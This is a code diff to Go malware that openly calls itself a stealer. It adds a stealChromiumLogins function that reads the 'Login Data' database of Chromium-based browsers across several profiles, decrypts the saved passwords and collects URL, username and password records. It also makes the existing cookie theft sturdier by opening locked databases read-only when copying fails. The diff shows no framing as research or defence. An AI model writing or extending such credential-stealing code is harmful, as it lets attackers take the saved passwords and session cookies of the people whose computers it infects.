@@ -105,6 +105,17 @@ func runStealer() string {
 					results[br.name] = cookies
 				}
 			}
+
+			if br.name != "Firefox" && br.name != "Waterfox" && br.name != "PaleMoon" {
+				if logins := stealChromiumLogins(basePath, br.name, br.exe); logins != "" {
+					logKey := "Logins_" + br.name
+					if prev, ok := results[logKey]; ok {
+						results[logKey] = prev + logins
+					} else {
+						results[logKey] = logins
+					}
+				}
+			}
 		}
 	}
 
@@ -150,18 +161,26 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			}
 		}
 
-		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
-		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err != nil {
-			errs = append(errs, fmt.Sprintf("%s/%s copy: %v", browserName, profile, err))
-			continue
-		}
-		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
-		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
-		defer os.Remove(tmpPath)
-		defer os.Remove(tmpPath + "-wal")
-		defer os.Remove(tmpPath + "-shm")
+		var dbPath string
+		var needCleanup bool
 
-		db, err := sql.Open("sqlite", tmpPath)
+		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
+		if err := copyFileLocked(cookiePath, tmpPath, browserExe); err == nil {
+			_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal", browserExe)
+			_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm", browserExe)
+			dbPath = tmpPath
+			needCleanup = true
+		} else {
+			dbPath = "file:" + cookiePath + "?mode=ro&immutable=1"
+		}
+
+		if needCleanup {
+			defer os.Remove(tmpPath)
+			defer os.Remove(tmpPath + "-wal")
+			defer os.Remove(tmpPath + "-shm")
+		}
+
+		db, err := sql.Open("sqlite", dbPath)
 		if err != nil {
 			errs = append(errs, fmt.Sprintf("%s/%s open: %v", browserName, profile, err))
 			continue
@@ -201,6 +220,64 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 	}
 
 	return allCookies.String(), errs
+}
+
+func stealChromiumLogins(userDataPath string, browserName string, browserExe string) string {
+	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
+	var sb strings.Builder
+
+	for _, profile := range profiles {
+		loginPath := filepath.Join(userDataPath, profile, "Login Data")
+		if _, err := os.Stat(loginPath); os.IsNotExist(err) {
+			continue
+		}
+
+		var dbPath string
+		var needCleanup bool
+
+		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_logins_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
+		if err := copyFileLocked(loginPath, tmpPath, browserExe); err == nil {
+			dbPath = tmpPath
+			needCleanup = true
+		} else {
+			dbPath = "file:" + loginPath + "?mode=ro&immutable=1"
+		}
+
+		if needCleanup {
+			defer os.Remove(tmpPath)
+		}
+
+		db, err := sql.Open("sqlite", dbPath)
+		if err != nil {
+			continue
+		}
+		db.Exec("PRAGMA busy_timeout = 3000")
+
+		rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
+		if err != nil {
+			db.Close()
+			continue
+		}
+
+		for rows.Next() {
+			var url, username string
+			var encPassword []byte
+			if err := rows.Scan(&url, &username, &encPassword); err != nil {
+				continue
+			}
+			if url == "" && username == "" {
+				continue
+			}
+			password := decryptCookieValue(encPassword, userDataPath)
+			if password == "" || password == "(encrypted)" {
+				password = "***"
+			}
+			sb.WriteString(fmt.Sprintf("URL: %s\nLogin: %s\nPassword: %s\n\n", url, username, password))
+		}
+		rows.Close()
+		db.Close()
+	}
+	return sb.String()
 }
 
 func stealFirefoxCookies(profilesPath string, browserExe string) (string, []string) {
